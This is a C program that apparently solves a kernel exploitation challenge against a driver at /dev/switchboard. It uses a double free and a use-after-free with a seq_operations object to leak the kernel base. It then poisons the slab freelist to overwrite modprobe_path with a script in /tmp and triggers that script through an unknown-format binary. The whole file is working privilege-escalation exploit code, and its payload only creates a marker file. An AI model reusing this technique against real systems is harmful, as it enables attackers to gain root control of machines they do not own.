#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <inttypes.h>

#define VULN_DEVICE "/dev/switchboard"
#define BUF_SIZE 32
#define RST 0x10
#define N_SET 0x20
#define OBJ_SELECT 0x30
#define OBJ_NEW 0x40
#define SETTINGS 0x50

int devfd;

int dev_free(int fd, int index){
    return ioctl(fd, RST, index);
}

int dev_create(int fd){
    return ioctl(fd, OBJ_NEW, NULL);
}

void dev_write(int fd, void *buffer, ssize_t len){
    write(fd, buffer, len);
}

void dev_read(int fd, void *buffer, ssize_t len){
    read(fd, buffer, len);
}

void dev_setlen(int fd, int len){
    ioctl(fd, N_SET, len);
}

int dev_select(int fd, int index){
    return ioctl(fd, OBJ_SELECT, index);
}

int dev_len(int fd, unsigned long length){
    return ioctl(fd, N_SET, length);
}

int dev_open(char* file, int flags){
    int fd;

    if ((fd = open(file, flags)) < 0){
        perror("[-] Error opening device");
        exit(1);
    }

    printf("[*] Opened device\n");

    return fd;
}

void logleak(char *name, unsigned long addr){
    printf("[*] %s => %#lx\n", name, addr);
}

void setup(){
    system("printf \xff\xff\xff\xff > /tmp/dummy");
    system("echo '#!/bin/sh' > /tmp/x");
    system("echo 'touch /tmp/pwned' >> /tmp/x");

    system("chmod +x /tmp/x");
    system("chmod +x /tmp/dummy");
}

void main(int argc, char** argv){
    setup();
    devfd = dev_open(VULN_DEVICE, O_RDWR);

    dev_create(devfd); // 0
    dev_create(devfd); // 1
    printf("[*] Created dev\n");

    usleep(20000);

    dev_select(devfd, 0);
    dev_free(devfd, 0); // inuse = 0 // el free esta en 0xffffffffc000043b
    dev_free(devfd, 0); // kfreed once
    dev_free(devfd, 0); // kfreed twice
    usleep(20000);
    unsigned long buf[4] = {0};

    dev_write(devfd, buf, 0x8); // allocate the double freed chunk once and set inuse==1

    usleep(5000);
    int seq_ops = open("/proc/self/stat", O_RDONLY); // allocate again (uaf) into freed chunk


    printf("[!] Allocated seq_operations object! Leaking...\n");
    unsigned long leak[3] = {0};

    dev_read(devfd, leak, 0x8);
    
    unsigned long kbase = leak[0] - 0x2531a0;
    unsigned long modprobe_path = kbase + 0x1850b20;
    logleak("kbase", kbase);

    
    close(seq_ops);

    dev_free(devfd, 0); // inuse = 0;
    dev_free(devfd, 0);

    usleep(15000);

    buf[2] = modprobe_path;


    dev_setlen(devfd, 0x18UL);
    dev_write(devfd, buf, 0x18); // tamper freelist with modprobe_path

    dev_free(devfd, 0);
    dev_select(devfd, 1);
    dev_free(devfd, 1);
    dev_free(devfd, 1);

    usleep(15000);

    dev_create(devfd); // kzalloc para buf y kzalloc para devices, falta 1 que sera en modprobe

    char* win = "/tmp/x\x00\x00";
    dev_write(devfd, win, 0x8);


    system("/tmp/dummy");


    return;
}
